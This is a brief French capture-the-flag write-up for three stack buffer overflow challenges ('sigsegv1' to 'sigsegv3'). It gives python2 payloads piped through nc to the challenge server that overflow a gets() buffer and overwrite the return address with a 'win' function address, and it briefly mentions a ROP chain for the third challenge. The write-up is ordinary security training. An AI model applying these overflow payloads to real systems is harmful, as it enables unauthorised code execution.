sigsegv1:
Il faut juste remplir le buffer et declencehr une sigsegv
le buffer fait 0x20 d'apres l'assembleur ET le code C
en mettant 0x28 on ecrase rbp et le NULL byte de gets ecrase l'adresse
de retour --> on a le flag

`python2 -c 'print("A"*0x28)' | nc nc.ctf.unitedctf.ca 4000`

sigsegv2:
Meme chose mais on ajoute l'adresse de retour vers win qui ne prend pas
d'argupments donc pas de soucis, attention on ets en x86_64
il faut bien penser à ecrire l'adresse de win en entiere (8 bytes)
On pet la trouver avec un objdump sur le binaire fourni

`python2 -c 'print("A"*0x28 + "\xa6\x09\x40" + "\x00"*5)' | nc nc.ctf.unitedctf.ca 4000`

sigsegv3:
meme fonctionnement mais rop chain pour fill rdi et rsi pour valider la condition

